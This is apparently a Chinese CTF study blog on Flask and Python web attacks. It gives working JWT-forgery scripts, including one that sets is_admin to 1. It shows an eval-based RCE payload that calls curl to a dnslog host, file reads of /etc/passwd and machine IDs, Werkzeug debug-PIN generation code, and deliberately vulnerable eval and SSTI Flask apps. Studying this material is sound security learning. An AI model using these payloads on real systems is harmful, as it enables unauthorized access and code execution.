<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> jwcrypto.common <span style="color:#f92672">import</span> base64url_decode, base64url_encode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">topic</span>(topic):
</span></span><span style="display:flex;"><span>	[header, payload, signature] <span style="color:#f92672">=</span> topic<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)
</span></span><span style="display:flex;"><span>	parsed_payload <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(base64url_decode(payload))
</span></span><span style="display:flex;"><span>	parsed_payload[<span style="color:#e6db74">&#39;sub&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bob&#39;</span>
</span></span><span style="display:flex;"><span>	parsed_payload[<span style="color:#e6db74">&#39;exp&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2000000000</span>
</span></span><span style="display:flex;"><span>	fake_payload <span style="color:#f92672">=</span> base64url_encode((json<span style="color:#f92672">.</span>dumps(parsed_payload, separators<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;,&#39;</span>, <span style="color:#e6db74">&#39;:&#39;</span>))))
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;{&#34;  &#39;</span> <span style="color:#f92672">+</span> header <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> fake_payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#34;:&#34;&#34;,&#34;protected&#34;:&#34;&#39;</span> <span style="color:#f92672">+</span> header <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;, &#34;payload&#34;:&#34;&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;,&#34;signature&#34;:&#34;&#39;</span> <span style="color:#f92672">+</span> signature <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;}&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>jwt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;xxxx.xxx.xxx&#34;</span>
</span></span><span style="display:flex;"><span>print(topic(jwt))
</span></span></code></pre></div><p>2022祥云杯 FunWEB</p>
<p>此题需要使key&rsquo;is_admin&rsquo; 的value为1来获取graphql 查询权限</p>
<p>伪造jwt的EXP如下（注意token每过一段时间会过期，需要重新生成）</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> timedelta
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> json <span style="color:#f92672">import</span> loads, dumps
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> jwcrypto.common <span style="color:#f92672">import</span> base64url_decode, base64url_encode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">topic</span>(topic):
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34; Use mix of JSON and compact format to insert forged claims including long expiration &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span> [header, payload, signature] <span style="color:#f92672">=</span> topic<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)
</span></span><span style="display:flex;"><span> parsed_payload <span style="color:#f92672">=</span> loads(base64url_decode(payload))
</span></span><span style="display:flex;"><span> parsed_payload[<span style="color:#e6db74">&#39;is_admin&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>			<span style="color:#75715e">#要改的地方</span>
</span></span><span style="display:flex;"><span> parsed_payload[<span style="color:#e6db74">&#39;exp&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2000000000</span>
</span></span><span style="display:flex;"><span> fake_payload <span style="color:#f92672">=</span> base64url_encode((dumps(parsed_payload, separators<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;,&#39;</span>, <span style="color:#e6db74">&#39;:&#39;</span>))))
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;{&#34;  &#39;</span> <span style="color:#f92672">+</span> header <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> fake_payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#34;:&#34;&#34;,&#34;protected&#34;:&#34;&#39;</span> <span style="color:#f92672">+</span> header <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;, &#34;payload&#34;:&#34;&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;,&#34;signature&#34;:&#34;&#39;</span> <span style="color:#f92672">+</span> signature <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;}&#39;</span>
</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> topic(<span style="color:#e6db74">&#39;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMzcwMzAsImlhdCI6MTY2NzEzNjczMCwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJ4YWxlR2dadl9BbDBRd1ZLLUgxb0p3IiwibmJmIjoxNjY3MTM2NzMwLCJwYXNzd29yZCI6IjEyMyIsInVzZXJuYW1lIjoiMTIzIn0.YnE5tK1noCJjultwUN0L1nwT8RnaU0XjYi5iio2EgbY7HtGNkSy_pOsnRl37Y5RJvdfdfWTDCzDdiz2B6Ehb1st5Fa35p2d99wzH4GzqfWfH5zfFer0HkQ3mIPnLi_9zFiZ4mQCOLJO9RBL4lD5zHVTJxEDrESlbaAbVOMqPRBf0Z8mon1PjP8UIBfDd4RDlIl9wthO-NlNaAUp45woswLe9YfRAQxN47qrLPje7qNnHVJczvvxR4-zlW0W7ahmYwODfS-KFp8AC80xgMCnrCbSR0_Iy1nsiCEO8w2y3BEcqvflOOVt_lazJv34M5e28q0czbLXAETSzpvW4lVSr7g&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(token)
</span></span></code></pre></div><p>此exp原文链接：https://blog.csdn.net/m0_64910183/article/details/127661200</p>
<p>原理：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042013230.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042013230.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042013230.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042013230.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042013230.png"
        title="image-20230204201308110" /></p>
<p>复现：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042030176.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042030176.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042030176.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042030176.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302042030176.png"
        title="image-20230204203037040" /></p>
<h1 id="rce">RCE</h1>
<h2 id="通过代码中存在的漏洞">通过代码中存在的漏洞</h2>
<p>一个简单的计算表达式的服务，使用了eval函数</p>
<p>get传参eval即可代码执行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hello_world</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;eval&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Result：</span><span style="color:#e6db74">{</span>eval(r)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        print(e)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Hello&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run()
</span></span></code></pre></div><p>传参如下实现无回显命令执行（相当于执行os.system()，执行curl y3j4ey.dnslog.cn）</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;curl y3j4ey.dnslog.cn&#39;</span>)
</span></span></code></pre></div><p>简单一点直接读flag</p>
<pre tabindex="0"><code>__import__(&#34;os&#34;).popen(&#34;ls&#34;).read();
</code></pre><h2 id="debug-pin">debug pin</h2>
<p>当flask开启debug模式时，输入pin可以进行命令执行，而这个pin码是可以伪造的</p>
<p>debug模式的报错界面</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051553181.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051553181.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051553181.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051553181.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051553181.png"
        title="image-20230205155330044" /></p>
<p>点击右边小图标可进入调试模式</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051553166.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051553166.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051553166.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051553166.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051553166.png"
        title="image-20230205155352037" /></p>
<p>要求输入pin码</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051554714.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051554714.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051554714.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051554714.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051554714.png"
        title="image-20230205155457602" /></p>
<p>可以以交互模式执行python程序</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051555888.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051555888.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051555888.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051555888.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051555888.png"
        title="image-20230205155520783" /></p>
<p>该漏洞一般还需要配合任意文件读取漏洞</p>
<p>需要的参数如下</p>
<pre tabindex="0"><code>获取启动Flask应用的用户名（可以读取/etc/passwd获取）（获取username）

一般默认：flask.app（获取modname）

flask目录下的一个app.py的绝对路径（可以通过报错页面看到）（获取app.py的绝对路径）（类似：/usr/local/lib/python3.5/site-packages/flask/app.py）


以及读取以下几个文件

    /sys/class/net/eth0/address（可能不是eth0，可能是ensxx）（获取网卡地址）
    
    /proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id（获取machine_id）

坑点：有的版本的flask只要读到三个文件中任意一个文件即可，

 有的版本从/etc/machine-id、/proc/sys/kernel/random/boot_id中任意一个文件读到值后就和/proc/self/cgroup中的id值拼接）
</code></pre><p>脚本如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#python3.8</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> getpass
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> chain
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> typing <span style="color:#66d9ef">as</span> t
</span></span><span style="display:flex;"><span>username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ctf&#39;</span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>modname<span style="color:#f92672">=</span>getattr(app, <span style="color:#e6db74">&#34;__module__&#34;</span>, t<span style="color:#f92672">.</span>cast(object, app)<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__module__)
</span></span><span style="display:flex;"><span>mod<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>modules<span style="color:#f92672">.</span>get(modname)
</span></span><span style="display:flex;"><span>mod <span style="color:#f92672">=</span> getattr(mod, <span style="color:#e6db74">&#34;__file__&#34;</span>, <span style="color:#66d9ef">None</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>probably_public_bits <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    username, <span style="color:#75715e">#用户名   3/etc/passwd</span>
</span></span><span style="display:flex;"><span>    modname,  <span style="color:#75715e">#一般固定为flask.app  # 默认值</span>
</span></span><span style="display:flex;"><span>    getattr(app, <span style="color:#e6db74">&#34;__name__&#34;</span>, app<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__name__), <span style="color:#75715e">#固定，一般为Flask   # 默认值</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;/usr/local/lib/python3.10/site-packages/flask/app.py&#39;</span>,   <span style="color:#75715e">#主程序（app.py）运行的绝对路径   # 报错得到   &#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39;</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>print(probably_public_bits)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#--------------------得到mac--------------------------------------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>mac <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;02:42:ac:02:82:f1&#39;</span><span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;:&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)      <span style="color:#75715e">#/sys/class/net/eth0/address 16进制转10进制/sys/class/net/ens0/address</span>
</span></span><span style="display:flex;"><span>mac<span style="color:#f92672">=</span>str(int(mac,base<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>))
</span></span><span style="display:flex;"><span>private_bits <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>   mac,<span style="color:#75715e">#mac地址十进制</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#---------------------------------------------得到机器码-------------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2.e0ad2d31-1d21-4f57-b1c5-4a9036fbf235   3.ce8f8f70290918043d103b11994529597f0be9cc46265a3838cd36f7e4d6e48e</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;e0ad2d31-1d21-4f57-b1c5-4a9036fbf235&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;ce8f8f70290918043d103b11994529597f0be9cc46265a3838cd36f7e4d6e48e&#34;</span>
</span></span><span style="display:flex;"><span>     ]
</span></span><span style="display:flex;"><span>print(private_bits)
</span></span><span style="display:flex;"><span>h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> chain(probably_public_bits, private_bits):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> bit:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(bit, str):
</span></span><span style="display:flex;"><span>        bit <span style="color:#f92672">=</span> bit<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(bit)
</span></span><span style="display:flex;"><span>h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cookiesalt&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cookie_name <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;__wzd</span><span style="color:#e6db74">{</span>h<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">20</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># If we need to generate a pin we salt it a bit more so that we don&#39;t</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># end up with the same value and generate out 9 digits</span>
</span></span><span style="display:flex;"><span>h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pinsalt&#34;</span>)
</span></span><span style="display:flex;"><span>num <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>int(h<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>)<span style="color:#e6db74">:</span><span style="color:#e6db74">09d</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>[:<span style="color:#ae81ff">9</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Format the pincode in groups of digits for easier remembering if</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we don&#39;t have a result yet.</span>
</span></span><span style="display:flex;"><span>rv<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> rv <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> group_size <span style="color:#f92672">in</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(num) <span style="color:#f92672">%</span> group_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            rv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">.</span>join(
</span></span><span style="display:flex;"><span>                num[x : x <span style="color:#f92672">+</span> group_size]<span style="color:#f92672">.</span>rjust(group_size, <span style="color:#e6db74">&#34;0&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(num), group_size)
</span></span><span style="display:flex;"><span>            )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        rv <span style="color:#f92672">=</span> num
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(rv)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#python3.6</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># import hashlib</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># import getpass</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># from flask import Flask</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># from itertools import chain</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># import sys</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># import uuid</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># username=getpass.getuser()</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># app = Flask(__name__)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># modname=getattr(app, &#34;__module__&#34;, app.__class__.__module__)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># mod = sys.modules.get(modname)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># probably_public_bits = [</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     username, #用户名 一般为root或者读下/etc/passwd</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     modname,  #一般固定为flask.app</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     getattr(app, &#34;__name__&#34;, app.__class__.__name__), #固定，一般为Flask</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     getattr(mod, &#34;__file__&#34;, None),    #flask库下app.py的绝对路径，可以通过报错信息得到</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># mac =&#39;02:42:ac:0c:ac:28&#39;.replace(&#39;:&#39;,&#39;&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># mac=str(int(mac,base=16))</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># private_bits = [</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 	mac,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># #旧版的只需要读取/proc/self/cgroup即可，但是新增需要在前面再拼上/etc/machine-id或者/proc/sys/kernel/random/boot_id的值,其他的参照3.8的</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 	 &#34;机器码&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 	 ]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># h = hashlib.md5()</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># for bit in chain(probably_public_bits, private_bits):</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     if not bit:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#         continue</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     if isinstance(bit, str):</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#         bit = bit.encode(&#34;utf-8&#34;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     h.update(bit)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># h.update(b&#34;cookiesalt&#34;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cookie_name = &#34;__wzd&#34; + h.hexdigest()[:20]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># # If we need to generate a pin we salt it a bit more so that we don&#39;t</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># # end up with the same value and generate out 9 digits</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># num=None</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># if num is None:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     h.update(b&#34;pinsalt&#34;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     num = (&#34;%09d&#34; % int(h.hexdigest(), 16))[:9]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># # Format the pincode in groups of digits for easier remembering if</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># # we don&#39;t have a result yet.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># rv=None</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># if rv is None:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     for group_size in 5, 4, 3:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#         if len(num) % group_size == 0:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#             rv = &#34;-&#34;.join(</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#                 num[x : x + group_size].rjust(group_size, &#34;0&#34;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#                 for x in range(0, len(num), group_size)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#             )</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#             break</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     else:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#         rv = num</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     print(rv)</span>
</span></span></code></pre></div><p>区别是旧版计算摘要信息（digest）用的是md5，新版计算摘要信息用的是sha1，实战不知道哪个的可以都试一下</p>
<h1 id="ssti">SSTI</h1>
<p>漏洞代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, render_template_string, request
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hello_world</span>():
</span></span><span style="display:flex;"><span>    name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;name&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">and</span> r <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> r
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template_string(<span style="color:#e6db74">&#34;Hello </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> name)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run()
</span></span></code></pre></div><p>index.html</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">title</span>&gt;Title&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;{{content}}&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>模板内容可控</p>
<h2 id="xss">XSS</h2>
